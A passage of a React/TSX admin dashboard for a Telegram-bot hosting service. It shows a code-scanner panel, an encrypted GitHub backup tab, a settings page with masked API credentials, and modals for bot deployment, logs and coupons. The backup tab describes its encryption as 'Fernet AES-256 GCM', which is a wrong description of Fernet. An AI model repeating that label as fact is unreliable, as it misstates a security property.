              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                
                {/* Code editor area */}
                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-4 flex flex-col space-y-3">
                  <div className="flex items-center justify-between text-xs text-slate-400">
                    <span className="flex items-center gap-1.5 font-mono">
                      <FileCode className="w-3.5 h-3.5 text-cyan-400" />
                      source_code.py
                    </span>
                    <span>Python 3.10 / 3.11</span>
                  </div>
                  <textarea
                    value={scannerCode}
                    onChange={(e) => setScannerCode(e.target.value)}
                    rows={16}
                    className="w-full bg-[#070b14] border border-slate-800 rounded-xl p-3 font-mono text-xs text-slate-200 focus:outline-none focus:border-cyan-500 leading-relaxed resize-none"
                    placeholder="Paste Python or JavaScript bot code here..."
                  />
                  <div className="flex justify-end">
                    <button
                      onClick={handleRunScan}
                      disabled={scanning}
                      className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold text-xs flex items-center gap-2 shadow-lg shadow-cyan-950/50 transition disabled:opacity-50"
                    >
                      <Sparkles className={`w-4 h-4 ${scanning ? 'animate-spin' : ''}`} />
                      {scanning ? 'Analyzing AST Rules...' : 'Run Security Scan'}
                    </button>
                  </div>
                </div>

                {/* Scan Result Breakdown */}
                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 flex flex-col justify-between space-y-4">
                  {scanResult ? (
                    <div className="space-y-4">
                      <div className="flex items-center justify-between">
                        <h3 className="font-bold text-white text-base">Security Verdict</h3>
                        <span className={`px-3 py-1 rounded-full text-xs font-mono font-bold flex items-center gap-1.5 ${
                          scanResult.verdict === 'SAFE'
                            ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                            : scanResult.verdict === 'MANUAL_REVIEW'
                            ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
                            : 'bg-rose-500/20 text-rose-400 border border-rose-500/40'
                        }`}>
                          {scanResult.verdict === 'SAFE' && <ShieldCheck className="w-4 h-4" />}
                          {scanResult.verdict === 'MANUAL_REVIEW' && <AlertTriangle className="w-4 h-4" />}
                          {scanResult.verdict === 'REJECT' && <ShieldX className="w-4 h-4" />}
                          {scanResult.verdict}
                        </span>
                      </div>

                      {/* Safety Gauge */}
                      <div className="p-4 rounded-xl bg-[#0b101e] border border-slate-800 space-y-2">
                        <div className="flex justify-between text-xs">
                          <span className="text-slate-400">Calculated Safety Score</span>
                          <span className="font-mono font-bold text-cyan-400">{scanResult.safety_score} / 100</span>
                        </div>
                        <div className="h-2.5 w-full bg-slate-800 rounded-full overflow-hidden">
                          <div
                            className={`h-full rounded-full transition-all duration-700 ${
                              scanResult.safety_score >= 80
                                ? 'bg-emerald-500'
                                : scanResult.safety_score >= 50
                                ? 'bg-amber-500'
                                : 'bg-rose-500'
                            }`}
                            style={{ width: `${scanResult.safety_score}%` }}
                          ></div>
                        </div>
                        <div className="flex justify-between text-[11px] text-slate-500 font-mono pt-1">
                          <span>High Threats: {scanResult.high_threats}</span>
                          <span>Warnings: {scanResult.review_needed}</span>
                        </div>
                      </div>

                      {/* Findings list */}
                      <div className="space-y-2">
                        <h4 className="text-xs font-semibold text-slate-300 uppercase tracking-wider">
                          Rule Violations Detected ({scanResult.findings.length})
                        </h4>
                        {scanResult.findings.length === 0 ? (
                          <div className="p-3 rounded-lg bg-emerald-950/20 border border-emerald-500/30 text-emerald-400 text-xs flex items-center gap-2">
                            <CheckCircle2 className="w-4 h-4 shrink-0" />
                            <span>No security violations or dangerous syscalls found. Verified safe for container execution.</span>
                          </div>
                        ) : (
                          <div className="max-h-56 overflow-y-auto space-y-2">
                            {scanResult.findings.map((f, idx) => (
                              <div key={idx} className="p-3 rounded-lg bg-[#070b14] border border-slate-800 text-xs space-y-1">
                                <div className="flex items-center justify-between">
                                  <span className="font-semibold text-rose-400">{f.category}: {f.rule}</span>
                                  <span className="font-mono text-slate-500 text-[11px]">Line {f.line}</span>
                                </div>
                                <code className="block text-[11px] text-slate-300 font-mono bg-slate-900 p-1.5 rounded truncate">
                                  {f.match}
                                </code>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>
                  ) : (
                    <div className="flex-1 flex flex-col items-center justify-center text-slate-500 text-xs p-8 text-center">
                      <Shield className="w-10 h-10 mb-2 opacity-40 text-cyan-400" />
                      <p className="font-medium text-slate-400">Scanner Ready</p>
                      <p className="mt-1 max-w-xs text-slate-500">
                        Paste bot source code and click "Run Security Scan" to detect malicious instructions before launching into a sandbox.
                      </p>
                    </div>
                  )}

                  <div className="text-[11px] text-slate-500 border-t border-slate-800 pt-3">
                    Automated sandbox enforcement restricts root capabilities, isolates network by default, and caps memory.
                  </div>
                </div>

              </div>
            </div>
          )}

          {/* TAB 9: CIPHER VAULT SYNC */}
          {activeTab === 'vault' && (
            <div id="view-vault" className="space-y-6">
              <div>
                <h2 className="text-xl font-bold text-white flex items-center gap-2">
                  <Lock className="w-5 h-5 text-amber-400" />
                  Cipher Vault Encrypted Synchronization
                </h2>
                <p className="text-xs text-slate-400">Zero-knowledge encrypted disaster recovery backups synced to GitHub repository</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 space-y-2">
                  <span className="text-xs text-slate-400 uppercase tracking-wider font-medium">Backup Repository</span>
                  <p className="font-mono text-cyan-400 font-semibold text-sm">{vaultInfo?.repo || 'Lord-Cipher/cipher-vault'}</p>
                  <p className="text-[11px] text-slate-500">Target Branch: {vaultInfo?.branch || 'main'}</p>
                </div>

                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 space-y-2">
                  <span className="text-xs text-slate-400 uppercase tracking-wider font-medium">Encryption Standard</span>
                  <p className="font-mono text-amber-400 font-semibold text-sm">Fernet AES-256 GCM</p>
                  <p className="text-[11px] text-slate-500">Client-side private symmetric key</p>
                </div>

                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 space-y-2">
                  <span className="text-xs text-slate-400 uppercase tracking-wider font-medium">Last Sync Timestamp</span>
                  <p className="font-mono text-slate-200 font-semibold text-sm">{vaultInfo?.last_sync ? new Date(vaultInfo.last_sync).toLocaleString() : 'Recent'}</p>
                  <p className="text-[11px] text-emerald-400">All local databases & settings secured</p>
                </div>
              </div>

              {/* Notification Banner */}
              {vaultMessage && (
                <div className="p-3.5 rounded-xl bg-cyan-950/40 border border-cyan-500/40 text-cyan-200 text-xs flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <CheckCircle2 className="w-4 h-4 text-cyan-400 shrink-0" />
                    <span>{vaultMessage}</span>
                  </div>
                  <button onClick={() => setVaultMessage(null)} className="text-slate-400 hover:text-white text-xs">✕</button>
                </div>
              )}

              {/* Credentials & Key Configuration Card */}
              <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-slate-800/80 pb-3 gap-2">
                  <div className="flex items-center gap-2">
                    <Key className="w-4 h-4 text-cyan-400" />
                    <h3 className="font-bold text-white text-sm">Vault Credentials & Fernet Keys (cipher_vault.json)</h3>
                  </div>
                  <span className={`px-2.5 py-0.5 rounded-full text-[11px] font-medium border w-fit ${vaultInfo?.has_token ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' : 'bg-amber-500/10 text-amber-400 border-amber-500/30'}`}>
                    {vaultInfo?.has_token ? '● GitHub Sync Configured' : '● Local Snapshots Active'}
                  </span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="text-xs font-semibold text-slate-300 block mb-1">CIPHER_VAULT_REPO</label>
                    <input
                      type="text"
                      value={vaultRepo}
                      onChange={(e) => setVaultRepo(e.target.value)}
                      placeholder="owner/repo (e.g. Lord-Cipher/cipher-vault)"
                      className="w-full bg-[#080d19] border border-slate-800 rounded-xl px-3 py-2 text-xs font-mono text-cyan-300 focus:outline-none focus:border-cyan-500"
                    />
                    <p className="text-[10px] text-slate-500 mt-1">গিটহাব ব্যাকআপ রিপোজিটরি (ডিফল্ট: Lord-Cipher/cipher-vault)</p>
                  </div>

                  <div>
                    <label className="text-xs font-semibold text-slate-300 block mb-1">CIPHER_VAULT_BRANCH</label>
                    <input
                      type="text"
                      value={vaultBranch}
                      onChange={(e) => setVaultBranch(e.target.value)}
                      placeholder="main"
                      className="w-full bg-[#080d19] border border-slate-800 rounded-xl px-3 py-2 text-xs font-mono text-slate-300 focus:outline-none focus:border-cyan-500"
                    />
                    <p className="text-[10px] text-slate-500 mt-1">টার্গেট ব্রাঞ্চের নাম (ডিফল্ট: main)</p>
                  </div>

                  <div className="md:col-span-2">
                    <div className="flex items-center justify-between mb-1">
                      <label className="text-xs font-semibold text-slate-300">CIPHER_VAULT_KEY (Fernet 32-Byte Secret Encryption Key)</label>
                      <button
                        type="button"
                        onClick={handleGenerateVaultKey}
                        disabled={savingVaultConfig}
                        className="text-[11px] text-cyan-400 hover:text-cyan-300 flex items-center gap-1 transition"
                      >
                        <RefreshCw className={`w-3 h-3 ${savingVaultConfig ? 'animate-spin' : ''}`} />
                        Generate New Key
                      </button>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="relative flex-1">
                        <input
                          type={showVaultKey ? "text" : "password"}
                          value={vaultKey}
                          onChange={(e) => setVaultKey(e.target.value)}
                          placeholder="Fernet AES-256 base64 key..."
                          className="w-full bg-[#080d19] border border-slate-800 rounded-xl px-3 py-2 pr-16 text-xs font-mono text-amber-300 focus:outline-none focus:border-amber-500"
                        />
                        <button
                          type="button"
                          onClick={() => setShowVaultKey(!showVaultKey)}
                          className="absolute right-2 top-2 text-slate-400 hover:text-slate-200 text-xs px-1.5 py-0.5"
                        >
                          {showVaultKey ? "Hide" : "Show"}
                        </button>
                      </div>
                      <button
                        type="button"
                        onClick={() => {
                          navigator.clipboard.writeText(vaultKey);
                          setCopiedKey(true);
                          setTimeout(() => setCopiedKey(false), 2000);
                        }}
                        className="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-xs flex items-center gap-1.5 transition shrink-0"
                      >
                        {copiedKey ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        {copiedKey ? "Copied" : "Copy"}
                      </button>
                    </div>
                    <p className="text-[10px] text-slate-500 mt-1">
                      ✅ আপনার জন্য একটি সিকিউর Fernet কী তৈরি করে সেভ করে দেওয়া হয়েছে।
                    </p>
                  </div>

                  <div className="md:col-span-2">
                    <label className="text-xs font-semibold text-slate-300 block mb-1">CIPHER_VAULT_TOKEN (GitHub Personal Access Token - Optional)</label>
                    <input
                      type="password"
                      value={vaultToken}
                      onChange={(e) => setVaultToken(e.target.value)}
                      placeholder="ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (Leave empty for local encrypted backup)"
                      className="w-full bg-[#080d19] border border-slate-800 rounded-xl px-3 py-2 text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500"
                    />
                    <p className="text-[10px] text-slate-500 mt-1">
                      গিটহাবে সরাসরি অটোমেটিক ব্যাকআপ পুশ করতে চাইলে আপনার GitHub Personal Access Token দিন। টোকেন না দিলেও লোকাল এনক্রিপ্ট ব্যাকআপ ও ড্যাশবোর্ড পুরোদমে চলবে।
                    </p>
                  </div>
                </div>

                <div className="flex justify-end pt-2 border-t border-slate-800/80">
                  <button
                    onClick={handleSaveVaultConfig}
                    disabled={savingVaultConfig}
                    className="px-4 py-2 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white font-semibold text-xs flex items-center gap-2 transition disabled:opacity-50"
                  >
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    {savingVaultConfig ? "Saving Config..." : "Save Vault Settings"}
                  </button>
                </div>
              </div>

              {/* Action Bar */}
              <div className="p-4 rounded-xl bg-gradient-to-r from-amber-950/30 to-indigo-950/30 border border-amber-500/30 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h4 className="font-bold text-amber-200 text-sm">Automated Disaster Recovery</h4>
                  <p className="text-xs text-slate-300">Creates an encrypted tarball of storage/panel_db.json and commits to GitHub.</p>
                </div>
                <button
                  onClick={handleTriggerVaultSync}
                  disabled={syncingVault}
                  className="px-5 py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs flex items-center justify-center gap-2 transition disabled:opacity-50 shadow-lg shadow-amber-950/40"
                >
                  <Lock className={`w-3.5 h-3.5 ${syncingVault ? 'animate-spin' : ''}`} />
                  {syncingVault ? 'Packaging & Encrypting...' : 'Trigger Instant Backup'}
                </button>
              </div>

              {/* Snapshots Table */}
              <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 overflow-hidden">
                <div className="p-4 border-b border-slate-800 flex items-center justify-between">
                  <h3 className="font-bold text-white text-sm">Encrypted Snapshot Ledger</h3>
                  <span className="text-xs text-slate-400">{vaultInfo?.snapshots?.length || 0} commits recorded</span>
                </div>
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs">
                    <thead className="bg-[#0b101e] text-slate-400 uppercase font-mono border-b border-slate-800">
                      <tr>
                        <th className="py-3 px-4">Snapshot ID</th>
                        <th className="py-3 px-4">Timestamp</th>
                        <th className="py-3 px-4">Files Encrypted</th>
                        <th className="py-3 px-4">Archive Size</th>
                        <th className="py-3 px-4">GitHub Commit</th>
                        <th className="py-3 px-4">Status</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60 text-slate-300 font-mono">
                      {vaultInfo?.snapshots?.map((snap: any) => (
                        <tr key={snap.id} className="hover:bg-slate-800/30">
                          <td className="py-3 px-4 text-amber-400 font-semibold">{snap.id}</td>
                          <td className="py-3 px-4 font-sans">{new Date(snap.timestamp).toLocaleString()}</td>
                          <td className="py-3 px-4">{snap.files_count} items</td>
                          <td className="py-3 px-4">{snap.size_kb} KB</td>
                          <td className="py-3 px-4 text-cyan-400">{snap.commit}</td>
                          <td className="py-3 px-4 font-sans">
                            <span className="px-2 py-0.5 rounded-full text-[10px] bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                              Verified
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {/* TAB 10: SETTINGS & CONFIG */}
          {activeTab === 'settings' && (
            <div id="view-settings" className="space-y-6">
              <div>
                <h2 className="text-xl font-bold text-white flex items-center gap-2">
                  <Settings className="w-5 h-5 text-cyan-400" />
                  Bot & Platform Configuration
                </h2>
                <p className="text-xs text-slate-400">Telegram Bot tokens, Admin credentials, Merchant API keys, and Mass Broadcast tool</p>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                
                {/* Platform Credentials */}
                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 space-y-4">
                  <h3 className="font-bold text-white text-sm flex items-center gap-2">
                    <Key className="w-4 h-4 text-cyan-400" />
                    Environment & API Credentials
                  </h3>

                  <div className="space-y-3 text-xs">
                    <div>
                      <label className="block text-slate-400 mb-1">Telegram Bot Token (BOT_TOKEN)</label>
                      <input
                        type="password"
                        readOnly
                        value={settings.bot_token || "••••••••••••••••••••••••••••••••••••••"}
                        className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-slate-300 font-mono"
                      />
                      <p className="text-[11px] text-slate-500 mt-1">Configured securely in environment variables.</p>
                    </div>

                    <div>
                      <label className="block text-slate-400 mb-1">Telegram Owner ID (OWNER_ID)</label>
                      <input
                        type="text"
                        readOnly
                        value={settings.owner_id || "1098234812"}
                        className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-slate-300 font-mono"
                      />
                    </div>

                    <div>
                      <label className="block text-slate-400 mb-1">OxaPay Crypto Merchant Key (OXAPAY_API_KEY)</label>
                      <input
                        type="password"
                        readOnly
                        value={settings.oxapay_key || "••••••••••••••••••••••••"}
                        className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-slate-300 font-mono"
                      />
                    </div>

                    <div>
                      <label className="block text-slate-400 mb-1">bKash / Nagad Local Merchant Numbers</label>
                      <div className="grid grid-cols-2 gap-2">
                        <input
                          type="text"
                          readOnly
                          value={settings.bkash_number || "01700000000"}
                          className="bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-slate-300 font-mono"
                        />
                        <input
                          type="text"
                          readOnly
                          value={settings.nagad_number || "01800000000"}
                          className="bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-slate-300 font-mono"
                        />
                      </div>
                    </div>

                    <div>
                      <label className="block text-slate-400 mb-1">Webhook URL Endpoint</label>
                      <input
                        type="text"
                        readOnly
                        value={settings.webhook_url || "https://hoohost-engine.railway.app/webhook"}
                        className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-slate-300 font-mono"
                      />
                    </div>
                  </div>
                </div>

                {/* Broadcast Announcement Tool */}
                <div className="bg-[#0f172a]/90 rounded-2xl border border-slate-800 p-5 space-y-4">
                  <h3 className="font-bold text-white text-sm flex items-center gap-2">
                    <Radio className="w-4 h-4 text-cyan-400" />
                    Broadcast Announcement to Subscribers
                  </h3>

                  <form onSubmit={handleSendBroadcast} className="space-y-3 text-xs">
                    <div>
                      <label className="block text-slate-400 mb-1">Broadcast Message Text</label>
                      <textarea
                        rows={5}
                        value={broadcastMessage}
                        onChange={(e) => setBroadcastMessage(e.target.value)}
                        placeholder="📢 Attention HooHost users: Scheduled maintenance window tonight at 02:00 UTC. Bot uptimes will not be interrupted."
                        className="w-full bg-[#0b101e] border border-slate-800 rounded-xl p-3 text-slate-200 focus:outline-none focus:border-cyan-500 leading-relaxed resize-none"
                      />
                    </div>

                    <div className="flex items-center gap-2">
                      <input
                        type="checkbox"
                        id="pin-broadcast"
                        checked={broadcastPin}
                        onChange={(e) => setBroadcastPin(e.target.checked)}
                        className="rounded border-slate-700 bg-slate-800 text-cyan-500 focus:ring-0"
                      />
                      <label htmlFor="pin-broadcast" className="text-slate-300 cursor-pointer">
                        Pin message automatically in Telegram chats
                      </label>
                    </div>

                    <button
                      type="submit"
                      className="w-full py-2.5 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold text-xs flex items-center justify-center gap-2 transition"
                    >
                      <Send className="w-3.5 h-3.5 text-slate-950" />
                      Send Broadcast to All Users
                    </button>

                    {broadcastAlert && (
                      <p className="p-2.5 rounded-lg bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs font-mono">
                        {broadcastAlert}
                      </p>
                    )}
                  </form>
                </div>

              </div>
            </div>
          )}

        </main>
      </div>

      {/* MODAL: DEPLOY NEW BOT */}
      {showDeployModal && (
        <div className="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#0f172a] border border-slate-800 rounded-2xl w-full max-w-lg p-6 space-y-4 shadow-2xl">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <h3 className="font-bold text-white text-base flex items-center gap-2">
                <Plus className="w-4 h-4 text-cyan-400" />
                Deploy New Bot Instance
              </h3>
              <button
                onClick={() => setShowDeployModal(false)}
                className="text-slate-400 hover:text-white"
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleDeployBot} className="space-y-4 text-xs">
              <div>
                <label className="block text-slate-300 mb-1 font-medium">Bot Name</label>
                <input
                  type="text"
                  required
                  value={newBotName}
                  onChange={(e) => setNewBotName(e.target.value)}
                  placeholder="e.g. MyTelegramShopBot"
                  className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-white focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-slate-300 mb-1 font-medium">Runtime Engine</label>
                  <select
                    value={newBotRuntime}
                    onChange={(e: any) => {
                      setNewBotRuntime(e.target.value);
                      setNewBotEntry(e.target.value === 'node' ? 'index.js' : 'bot.py');
                    }}
                    className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-white focus:outline-none focus:border-cyan-500 font-mono"
                  >
                    <option value="python">Python 3.11 Slim</option>
                    <option value="node">Node.js 22 Slim</option>
                  </select>
                </div>

                <div>
                  <label className="block text-slate-300 mb-1 font-medium">Resource Tier</label>
                  <select
                    value={newBotPlan}
                    onChange={(e) => setNewBotPlan(e.target.value)}
                    className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-white focus:outline-none focus:border-cyan-500 font-mono"
                  >
                    <option value="free">Free (256MB / 0.25 vCPU)</option>
                    <option value="basic">Starter (512MB / 0.50 vCPU)</option>
                    <option value="pro">Pro (1024MB / 1.00 vCPU)</option>
                    <option value="ultra">Ultra (2048MB / 2.00 vCPU)</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="block text-slate-300 mb-1 font-medium">Entrypoint File</label>
                <input
                  type="text"
                  required
                  value={newBotEntry}
                  onChange={(e) => setNewBotEntry(e.target.value)}
                  className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-white font-mono focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="block text-slate-300 mb-1 font-medium">Environment Variables (KEY=VALUE per line)</label>
                <textarea
                  rows={4}
                  value={newBotEnv}
                  onChange={(e) => setNewBotEnv(e.target.value)}
                  className="w-full bg-[#0b101e] border border-slate-800 rounded-xl p-2.5 text-white font-mono focus:outline-none focus:border-cyan-500 text-[11px]"
                />
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowDeployModal(false)}
                  className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-medium transition"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-5 py-2 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold transition"
                >
                  Launch Container
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* MODAL: LIVE LOGS */}
      {selectedBotLogs && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#0f172a] border border-slate-800 rounded-2xl w-full max-w-3xl p-6 space-y-4 shadow-2xl flex flex-col h-[600px]">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div>
                <h3 className="font-bold text-white text-base flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-cyan-400" />
                  Console Stream: {selectedBotLogs.name}
                </h3>
                <p className="text-xs text-slate-400">PID: {selectedBotLogs.pid ?? 'Inactive'} • Node: {selectedBotLogs.node}</p>
              </div>
              <button
                onClick={() => setSelectedBotLogs(null)}
                className="text-slate-400 hover:text-white"
              >
                ✕
              </button>
            </div>

            {/* Terminal Window */}
            <div className="flex-1 bg-[#070b14] border border-slate-800 rounded-xl p-4 font-mono text-xs overflow-y-auto space-y-1 text-slate-300">
              {selectedBotLogs.logs.map((log, idx) => (
                <div key={idx} className="leading-relaxed hover:bg-slate-900/60 px-1 rounded">
                  <span className="text-slate-500 mr-2">{idx + 1}</span>
                  <span className={
                    log.includes('[ERROR]') || log.includes('Traceback')
                      ? 'text-rose-400'
                      : log.includes('[SUCCESS]')
                      ? 'text-emerald-400'
                      : log.includes('[INFO]')
                      ? 'text-cyan-300'
                      : 'text-slate-300'
                  }>
                    {log}
                  </span>
                </div>
              ))}
            </div>

            <div className="flex items-center justify-between pt-2 border-t border-slate-800 text-xs text-slate-400">
              <span>Streaming stdout/stderr directly from container sandbox</span>
              <button
                onClick={() => setSelectedBotLogs(null)}
                className="px-4 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 transition"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* MODAL: ADD COUPON */}
      {showAddCouponModal && (
        <div className="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#0f172a] border border-slate-800 rounded-2xl w-full max-w-md p-6 space-y-4 shadow-2xl">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <h3 className="font-bold text-white text-base flex items-center gap-2">
                <Tag className="w-4 h-4 text-cyan-400" />
                Create Promotional Coupon
              </h3>
              <button
                onClick={() => setShowAddCouponModal(false)}
                className="text-slate-400 hover:text-white"
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleCreateCoupon} className="space-y-4 text-xs">
              <div>
                <label className="block text-slate-300 mb-1 font-medium">Coupon Code (Uppercase)</label>
                <input
                  type="text"
                  required
                  value={newCouponCode}
                  onChange={(e) => setNewCouponCode(e.target.value.toUpperCase())}
                  placeholder="e.g. FLASH30"
                  className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-white font-mono focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="block text-slate-300 mb-1 font-medium">Discount Percentage (%)</label>
                <input
                  type="number"
                  min={1}
                  max={100}
                  required
                  value={newCouponDiscount}
                  onChange={(e) => setNewCouponDiscount(Number(e.target.value))}
                  className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-white font-mono focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="block text-slate-300 mb-1 font-medium">Maximum Redemptions</label>
                <input
                  type="number"
                  min={1}
                  required
                  value={newCouponMaxUses}
                  onChange={(e) => setNewCouponMaxUses(Number(e.target.value))}
                  className="w-full bg-[#0b101e] border border-slate-800 rounded-xl px-3 py-2 text-white font-mono focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowAddCouponModal(false)}
                  className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-medium transition"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-5 py-2 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-bold transition"
                >
                  Save Coupon
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

    </div>
  );
}
